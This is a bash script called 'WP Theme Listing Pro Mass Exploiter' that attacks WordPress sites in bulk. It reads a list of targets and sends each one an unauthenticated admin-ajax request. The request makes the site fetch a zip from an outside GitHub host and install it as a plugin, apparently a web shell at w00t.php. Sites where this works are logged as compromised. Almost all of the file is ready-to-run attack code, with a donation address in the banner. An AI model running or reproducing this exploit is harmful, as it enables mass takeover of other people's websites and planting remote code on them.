#!/bin/bash
# WP Theme Listing Pro Mass Exploiter
# Created By Im-Hanzou
# Using GNU Parallel
# Usage: bash exploit.sh list.txt thread 

yellow='\033[0;33m'
cat << "EOF"
  _      _____    __   _     __  _           ___         
 | | /| / / _ \  / /  (_)__ / /_(_)__  ___ _/ _ \_______ 
 | |/ |/ / ___/ / /__/ (_-</ __/ / _ \/ _ `/ ___/ __/ _ \
 |__/|__/_/    /____/_/___/\__/_/_//_/\_, /_/  /_/  \___/
                                     /___/               
EOF
printf "     Mass Exploiter\n\n"
printf "${yellow}Created By Im-Hanzou
Github : im-hanzou
Donate BTC : 3Avek8froL5sdAmzPUTDNhhpkKe21CscKP\n\n"

exploit(){	
classic='\033[0m'
red='\e[41m'
green='\e[42m'
target=$1
thread=$2

if [[ $(curl -s --connect-timeout 10 --max-time 10 --insecure $target'/wp-admin/admin-ajax.php' -d 'action=lp_cc_addons_actions&ccAction=install&ccDestin=external&ccFileUrl=http://github.com/im-hanzou/wp-listingpro/raw/main/w00t.zip') =~ '{"status":"success"}' ]]; 
then
    printf "${green}[ Vuln ]${classic} => [$target/wp-content/plugins/w00t/w00t.php] \n";
    echo "$target/wp-content/plugins/w00t/w00t.php" >> vuln.txt
    else
    printf "${red}[ Not Vuln ]${classic} => $target \n";
    echo "$target" >> notvuln.txt
fi
}

export -f exploit
parallel -j $2 exploit :::: $1 

total=$(cat vuln.txt | wc -l)
totalb=$(cat notvuln.txt | wc -l)
printf "\033[0;36mTotal Vuln : $total\n";
printf "\033[0;36mTotal Bad : $totalb\n";
